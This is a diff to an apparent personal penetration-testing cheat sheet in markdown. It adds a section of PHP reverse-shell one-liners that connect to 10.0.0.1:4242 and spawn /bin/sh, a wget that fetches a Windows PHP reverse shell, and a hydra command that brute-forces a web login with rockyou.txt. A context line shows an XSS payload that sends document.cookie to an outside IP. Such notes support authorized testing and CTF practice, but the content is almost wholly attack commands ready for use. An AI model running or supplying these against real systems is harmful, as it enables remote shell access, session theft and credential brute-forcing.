@@ -131,8 +131,42 @@ i.src="http://172.30.10.210:8888/?"+document.cookie;
 ##################################################################
 -->
 
-## Useful Commands
+## Shells
 
-### Brute Force Web Login
+### PHP
+
+`php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'`
+
+`php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`
+
+`php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'`
+
+`php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'`
+
+`php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'`
+
+`php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'`
+
+`php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`
+
+### Windows PHP Reverse Shell
+
+`wget https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php`
+
+<!--
+##################################################################
+##################################################################
+-->
+
+## Brute Forcing
+
+### Web Login
 
 `hydra -L /home/n0m4d1k/usernames -P /usr/share/wordlists/rockyou.txt -t 16 172.30.73.80 http-post-form "/login.php:username=^USER^&password=^PASS^&action=Login:Incorrect username or password"`
+
+<!--
+##################################################################
+##################################################################
+-->
+
+## Useful Commands
